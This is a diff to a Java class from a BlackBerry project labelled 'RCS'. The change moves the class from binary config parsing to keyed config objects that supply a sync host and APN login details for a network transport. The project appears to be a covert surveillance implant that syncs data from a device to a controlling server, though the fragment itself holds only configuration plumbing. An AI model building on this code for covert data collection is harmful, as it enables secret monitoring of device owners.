@@ -6,20 +6,16 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.action.sync;
 
-import java.io.EOFException;
-import java.util.Vector;
-
-import net.rim.device.api.util.DataBuffer;
 import blackberry.action.Apn;
 import blackberry.action.sync.transport.ApnTransport;
-import blackberry.action.sync.transport.Wap2Transport;
-import blackberry.debug.Check;
+import blackberry.config.ChildConf;
+import blackberry.config.ConfAction;
+import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.utils.WChar;
 
 public class SyncActionApn extends SyncAction {
     //#ifdef DEBUG
@@ -28,90 +24,44 @@ public class SyncActionApn extends SyncAction {
 
     String host;
 
-    public SyncActionApn(final int actionId_, final byte[] confParams) {
-        super(actionId_, confParams);
+    private boolean stop;
 
-        //#ifdef DBC
-        Check.requires(actionId == ACTION_SYNC_APN, "Wrong ActionId");
-        //#endif
+    public SyncActionApn(ConfAction conf) {
+        super(conf);
     }
 
-    protected boolean parse(final byte[] confParams) {
-
-        Vector apns = new Vector();
-
-        //#ifdef DBC
-        Check.requires(apns != null, "parse: apns null");
-        //#endif
-
-        final DataBuffer databuffer = new DataBuffer(confParams, 0,
-                confParams.length, false);
+    protected boolean parse(final ConfAction params) {
+        Apn apn;
 
         try {
-            final int hostLen = databuffer.readInt();
-            final byte[] hostRaw = new byte[hostLen];
-
-            databuffer.readFully(hostRaw);
-            host = WChar.getString(hostRaw, true);
+            host = params.getString("host");
+            stop = params.getBoolean("stop");
 
             //#ifdef DEBUG
             debug.trace("host: " + host);
             //#endif
 
-            final int entries = databuffer.readInt(); // readByte();
+            apn = new Apn();
+            ChildConf apnConf = params.getChild("apn");
 
-            int len;
-            byte[] stringRaw;
+            apn.apn = apnConf.getString("name");
+            apn.user = apnConf.getString("user");
+            apn.pass = apnConf.getString("pass");
 
-            for (int i = 0; i < entries; i++) {
-                final Apn apn = new Apn();
-                apn.mcc = databuffer.readInt(); // readShort();
-                apn.mnc = databuffer.readInt(); // readShort();
-
-                len = databuffer.readInt(); // readShort();
-                stringRaw = new byte[len];
-                databuffer.readFully(stringRaw);
-                apn.apn = WChar.getString(stringRaw, true);
-
-                len = databuffer.readInt(); // readShort();
-                stringRaw = new byte[len];
-                databuffer.readFully(stringRaw);
-                apn.user = WChar.getString(stringRaw, true);
-
-                len = databuffer.readInt(); //readShort();
-                stringRaw = new byte[len];
-                databuffer.readFully(stringRaw);
-                apn.pass = WChar.getString(stringRaw, true);
-
-                if (apn.isValid()) {
-                    //#ifdef DEBUG
-                    debug.trace("adding apn: " + apn);
-                    //#endif
-                    apns.addElement(apn);
-                }
-            }
-
-            if (apns.size() == 0) {
+            if (apn.isValid()) {
                 //#ifdef DEBUG
-                debug.trace("No valid apn, adding Wap2Transport");
+                debug.trace("adding apn: " + apn);
                 //#endif
-                transports.addElement(new Wap2Transport(host));
+
+                transports.addElement(new ApnTransport(host, apn));
+
             } else {
-                for (int i = 0; i < apns.size(); i++) {
-                    Apn apn = (Apn) apns.elementAt(i);
-                    //#ifdef DEBUG
-                    debug.trace("parse, adding ApnTransport: " + apn);
-                    //#endif
-
-                    //#ifdef DBC
-                    Check.asserts(apn.apn.length() > 0, "Invalid apn");
-                    //#endif
-
-                    transports.addElement(new ApnTransport(host, apn));
-                }
+                //#ifdef DEBUG
+                debug.trace("No valid apn");
+                //#endif
             }
 
-        } catch (final EOFException e) {
+        }  catch (final ConfigurationException e) {
             //#ifdef DEBUG
             debug.error("params FAILED");
             //#endif
